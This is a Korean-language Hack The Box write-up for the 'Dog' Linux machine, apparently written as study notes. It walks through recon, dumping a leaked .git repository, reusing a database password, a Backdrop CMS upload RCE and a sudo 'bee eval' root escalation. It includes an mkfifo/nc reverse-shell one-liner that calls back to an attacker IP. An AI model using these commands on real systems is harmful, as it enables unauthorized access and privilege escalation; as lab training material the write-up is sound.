# HTB-DOG
```bash
OS: Linux
DATE: 26.10.16
DIFFICULTY: Easy
```

## RECON
**nmap**: 열거를 위해 포트 검사를 진행하였다. 먼저 전체 포트 검사와 상세 포트 검사를 진행하였다
```bash
nmap -p- -T4 IP | grep -oP '^\d+/tcp' | cut -d/ -f1 | paste -sd,
```
```bash
nmap -sC -sV -p 22,80 IP
```
포트 검사 결과 22, 80(HTTP) 서비스가 돌아간다는 것을 알게 되었고, 상세 검사를 통해 .git 파일이 유출되어 있다는 것을 알게 되었다

## Initial Access
초기 접근을 위해 HTTP 서비스에 접근해본 결과 @dog.htb라는 도메인을 알게 되었고 **Backdrop CMS**라는 것도 알게 되었다. 대상 CMS는 취약점이 많기에 버전을 찾아본 후 취약점을 이용하려고 했다. 이후 git dumper를 이용하여 소스코드를 모았다
```bash
python3 git_dumper.py http://dog.htb/.git ./git
```
그 결과 여러 가지 소스코드를 얻을 수 있었다. 따라서 이제 크레덴셜이 있는지 열심히 찾아보았다
```bash
grep -iER "pwd|password" .
```
많은 결과가 나왔지만 실제 패스워드나 크레덴셜은 찾을 수 없었다. 따라서 DB나 settings.php 소스코드를 살펴보았다. settings.php를 확인한 결과
```php
$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';
$database_prefix = '';
```
이런 값을 얻게 되었다. 따라서 다시 웹에 접속하여 root, admin 유저 계정으로 password를 실행했지만 모두 로그인 실패하였다. 따라서 다시 한 번 덤프한 파일들을 더 찾아보았다
```bash
grep -iER "dog.htb" .
```
찾아보던 중 타겟 도메인을 찾아본 결과 tiffany@dog.htb라는 유저명을 알게 되었다. 따라서 지금까지 얻은 정보들로 웹에 로그인해본 결과 Backdrop CMS에 접속을 성공하였다. 따라서 아까 git 소스코드에서 Backdrop CMS 1.27.1이라는 버전을 알게 되었기에 대상 취약점을 찾아보았다. 찾아본 결과 [Backdrop_CMS_1.27.1_RCE](https://github.com/Goultarde/Backdrop_CMS_1.27.1_RCE)라는 exploit PoC를 알게 되었다. 대상 취약점은 `?q=admin/installer/manual` 위치, 즉 theme을 업로드할 수 있는 페이지에서 쉘코드가 들어가 있는 tar을 업로드하고 접속하면 RCE가 성공하는 취약점이었다. 따라서 먼저 shell 폴더에 shell.info와 shell.php가 들어가야 하기 때문에, 받은 poc에서 shell.php만 리버스 쉘로 수정해준 후 tar을 진행하였다
```bash
nano shell/shell.php
```
```bash
tar -czf shell.tar.gz shell
```
이후 `?q=admin/installer/manual`에 접속하여 tar.gz 파일을 업로드해준 후 리스닝 포트를 켜주었다
```bash
nc -nlvp 4444
```
이후 `modules/shell/shell.php`에 접속하여 초기 www-data 쉘을 얻을 수 있게 되었다. 따라서 더 높은 권한으로 가기 위해 아까 얻은 DB 정보로 DB에 접속하였다
```bash
mysql -u root -h localhost -p backdrop
```
```sql
select * from users;
```
users 테이블을 출력한 결과 여러 유저들의 password를 알 수 있었다. 이것을 모두 모아 `tr -d '| '`로 깔끔하게 정리해준 후 hashcat 7900 모드로 크랙을 시도하였다
```bash
hashcat -m 7900 hash /usr/share/wordlists/rockyou.txt
```
하지만 많은 시간이 흐름에도 불구하고 크랙이 불가능하였다. 따라서 다른 방법을 찾아보았다. 설마 패스워드 재사용인가 생각하여 jobert, johncusack 유저로 ssh 접속을 시도한 결과 **johncusack** 유저로 접속을 성공하였다

![user](attach_real/Pasted%20image%2020261022110013.png)

## Privilege Escalation
쉘에 접속 후 sudo -l을 확인해보았다
```bash
sudo -l

User johncusack may run the following commands on dog:
    (ALL : ALL) /usr/local/bin/bee
```
root 권한으로 bee를 사용할 수 있다는 것을 알게 되어 구글에 sudo bee priv를 검색해보았다. 검색 결과 [Sudo bee Binary Abuse](https://hacking-notes.jord4n.pro/privesc/sudoers/sudo-bee-binary-linux-privilege-escalation)라는, 자세한 권한 상승 방법이 나와 있는 것을 찾을 수 있었다. bee sudo 권한 상승 방법은 `sudo /usr/local/bin/bee --root=/var/www/html eval 'shell_exec("/bin/bash -p");'` 이런 형식으로 eval 함수를 악용하여 root로 권한 상승이 가능하였다. 따라서 나온 그대로 시도해보았다
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'shell_exec("/bin/bash -p");'
```
하지만 루트 쉘은 얻었지만 ls나 cat 등 다른 모든 명령어가 불가능한 쉘을 얻었다. 따라서 명령어를 입력하는 곳에 nc 리버스 쉘을 넣어 쉘을 받아주었다
```bash
sudo /usr/local/bin/bee --root=/var/www/html eval 'shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc IP 4445 >/tmp/f");'
```
```bash
nc -nlvp 4445

connect to [IP] from (UNKNOWN) [10.129.231.223] 36640 
#
```
그 결과 완전한 루트 쉘을 얻을 수 있게 되었다

![root](attach_real/Pasted%20image%2020261022110817.png)



## New Inform
- 크레덴셜 헌팅을 할 때 먼저 setting page나 config 파일을 뒤지자
- 항상 password라는 이름일 것이라는 생각은 버리자
- grep을 할 때 도메인도 사용해서 grep하자
- tar -czf로 압축 가능
- tar만 시도하지 말고 tar.gz도 시도
- `tr -d '| '`로 지우고 싶은 거 지울 수 있음
- 항상 쉘을 따고 뭔가 시도하기 전에 재사용을 먼저 생각하자
- 크랙하기 전에 패스워드 재사용부터 생각하자
- 앞으로 DB나 뭔가 패스워드를 얻었으면 admin 패널, ssh 등등 다 사용할 생각하자
- 그냥 bash 권한 상승이 안 되면 리버스 쉘도 생각하자
- shell_exec()는 인터랙티브 쉘을 띄우라고 만든 함수가 아니다. stdout을 전부 캡처해서 명령이 끝나면 문자열로 반환한다. 따라서 인터랙티브 쉘이 안 됐다